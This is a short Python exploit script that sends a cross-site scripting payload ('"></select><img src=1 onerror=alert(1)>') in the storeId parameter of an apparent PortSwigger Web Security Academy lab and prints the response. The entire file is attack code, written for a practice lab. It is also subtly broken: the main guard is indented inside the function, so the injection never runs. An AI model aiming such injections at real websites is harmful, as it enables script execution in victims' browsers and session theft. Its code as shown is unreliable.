import requests

HOST = "LAB-ID.web-security-academy.net"
BASE_URL = f"https://{HOST}"
HEADERS = {
    "Host": HOST,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://portswigger.net/",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site"
}

payload = '"></select><img%20src=1%20onerror=alert(1)>'

def injection():
    url = f"{BASE_URL}/product?productId=1&storeId={payload}"
    print(f"sending request to {url}")
    response = requests.get(url,headers=HEADERS)
    
    if response.status_code == 200:
        print("Yep! Request has submitted successfully!")
        print("Server's response:")
        print(response.text[:500]) #show only begin 500 characters of response
    else:
        print(f"Error: server's code response: {response.status_code}")
        
    if __name__ == "__main__":
        injection() 
